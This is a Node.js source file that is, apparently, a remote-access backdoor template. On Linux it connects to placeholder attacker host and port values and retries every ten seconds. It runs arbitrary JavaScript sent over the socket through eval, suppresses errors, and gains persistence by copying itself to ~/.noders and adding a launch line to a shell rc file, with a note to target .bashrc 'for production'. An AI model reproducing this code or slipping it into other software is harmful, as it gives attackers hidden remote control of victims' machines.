if (process.platform == 'linux') {

    (() => {
        const PORT = '^socket_port^'
        const HOST = '^host_ip^'
        const TYPE = '^MODULE^'

        function decodeCommand(command) {
            const enc = new TextDecoder('utf-8')
            return enc.decode(command.slice(1))
        }

        // INITIALIZE SOCKET CONNECTION
        const net = require('net')

        const client = new net.Socket()
        let connected = false
        let killed = false
        client.on('error', () => { /*if (!killed && !connected) setTimeout(start, 10000)*/ })
        client.on('close', () => { connected = false; if (!killed) setTimeout(() => client.connect(PORT, HOST), 10000)/* retry connection */ })
        const start = async () => {
            if (killed) return
            await client.connect(PORT, HOST, () => {
                connected = true
                client.on('data', data => {
                    if (data[0] == 0x05) {
                        client.write(TYPE)
                    } else if (data[0] == 0x01) {
                        // DESTROY CONNECTION
                        client.write(new Uint8Array([true]))
                        killed = true
                        connected = false
                        client.destroy()
                    } else if (data[0] == 0x02) {
                        // EXECUTE JS
                        try {
                            // javascript-obfuscator:disable
                            const _resF_ = (text) => client.write(text)
                            // javascript-obfuscator:enable
                            client.write(eval(decodeCommand(data)))
                        } catch (e) {
                            // do not log exceptions
                        }
                    } else if (data[0] == 0x03) {
                        // PERSISTANCE
                        const fs = require('fs')
                        const path = require('path')
                        const home = require('os').homedir()
                        const rc = '.noderc' // TODO: Change to .bashrc for production
                        fs.writeFileSync(path.join(home, '.noders'), fs.readFileSync(__filename).toString().replace('^MODULE^', '^GLOBAL^'))
                        if (!fs.existsSync(path.join(home, rc)) || fs.readFileSync(path.join(home, rc)).toString().includes(path.join(home, '.noders')))
                            fs.appendFileSync(path.join(home, rc), `node ${path.join(home, '.noders')}\n`)

                        // CLOSE THIS AND START GLOBAL CODE
                        killed = true
                        client.destroy()
                        let gc = require('child_process').spawn('node', ['~/.noders'], { detached: true, shell: true, stdio: 'ignore' })
                        gc.unref()
                    }

                })
            })
        }
        start()
    })()
}